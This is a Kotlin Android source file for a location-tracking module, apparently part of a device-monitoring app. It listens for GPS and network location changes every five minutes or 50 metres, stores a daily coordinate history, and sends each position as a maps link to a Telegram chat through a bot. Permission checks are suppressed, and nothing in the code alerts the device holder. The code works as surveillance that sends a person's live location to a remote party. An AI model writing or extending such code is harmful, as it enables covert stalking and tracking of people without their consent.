package com.dec.monitor.location

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

object LocationTracker {

    private var isTracking = false
    private var locationManager: LocationManager? = null
    private var lastLat = 0.0
    private var lastLon = 0.0
    private val locationHistory = mutableListOf<String>()

    private val listener = object : LocationListener {
        override fun onLocationChanged(loc: Location) {
            val lat = loc.latitude
            val lon = loc.longitude
            val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())

            // only send if moved more than 50 meters
            val results = FloatArray(1)
            if (lastLat != 0.0) {
                Location.distanceBetween(lastLat, lastLon, lat, lon, results)
                if (results[0] < 50) return
            }

            lastLat = lat
            lastLon = lon
            val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
            val entry = "[$time] $lat,$lon"
            locationHistory.add(entry)

            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("📍 <b>Location Update</b>\n$time — <a href=\"$mapsUrl\">Open Maps</a>\n±${loc.accuracy.toInt()}m")
            }
        }

        @Deprecated("Deprecated in Java")
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    fun startTracking(context: Context) {
        if (isTracking) return
        isTracking = true
        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        try {
            val lm = locationManager!!
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                @Suppress("MissingPermission")
                lm.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    5 * 60 * 1000L, // 5 min
                    50f, // 50 meters
                    listener,
                    Looper.getMainLooper()
                )
            }
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                @Suppress("MissingPermission")
                lm.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    5 * 60 * 1000L,
                    50f,
                    listener,
                    Looper.getMainLooper()
                )
            }
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("📍 Live location tracking started — updates every 5min or 50m movement")
            }
        } catch (e: Exception) {
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("📍 Location tracking failed: ${e.message}")
            }
        }
    }

    fun stopTracking() {
        isTracking = false
        locationManager?.removeUpdates(listener)
        locationManager = null
    }

    fun getDayHistory(): String {
        return if (locationHistory.isEmpty()) "No location data today"
        else locationHistory.joinToString("\n")
    }
}
